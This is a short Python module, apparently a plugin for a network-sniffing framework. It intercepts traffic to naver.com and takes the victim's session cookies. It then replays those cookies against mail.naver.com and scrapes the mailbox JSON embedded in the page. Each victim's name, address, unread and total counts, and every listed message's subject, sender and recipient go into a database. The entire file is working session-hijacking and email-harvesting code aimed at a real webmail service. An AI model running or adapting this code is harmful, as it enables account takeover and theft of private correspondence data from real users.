import datetime
import json

import requests
from database import Session

from analysis.utility import http_request_filter
from .model import MailList, MailSize

session = Session()


@http_request_filter("(.*naver.com)")
def handler(req):
    mail_json_sniff(req.cookie)


def mail_json_sniff(cookie_data):

    requer = requests.get("https://mail.naver.com", cookies=cookie_data)

    response = requer.content
    json_start_idx = response.find(b"mInfo = $Json")
    if json_start_idx != -1:
        json_end_idx = response.find(b".toObject()")
        json_mail = (response[json_start_idx + 14: json_end_idx - 1])
    else:
        return
    json_mail = json.loads(json_mail.decode())

    session.add(MailSize(json_mail['env']['userName'],
                         json_mail['env']['mailAddress'],
                         json_mail['folder']['humanReadable'],
                         json_mail['list']['folderName'],
                         json_mail['list']['unreadCount'],
                         json_mail['list']['totalCount']))

    mail_data_list = json_mail['list']['mailData']
    for mail in mail_data_list:

        if mail['toList'][0]['name'] == '':
            mail['toList'][0]['name'] = "None"

        sent_time = datetime.datetime.fromtimestamp(mail['sentTime']) + datetime.timedelta(0, 0, 0, 0, 0, 16)

        session.add(MailList(json_mail['env']['userName'],
                             json_mail['env']['mailAddress'],
                             mail['subject'],
                             mail['toList'][0]['email'],
                             mail['toList'][0]['name'],
                             mail['from']['email'],
                             mail['from']['name'],
                             sent_time)
                    )

    session.commit()
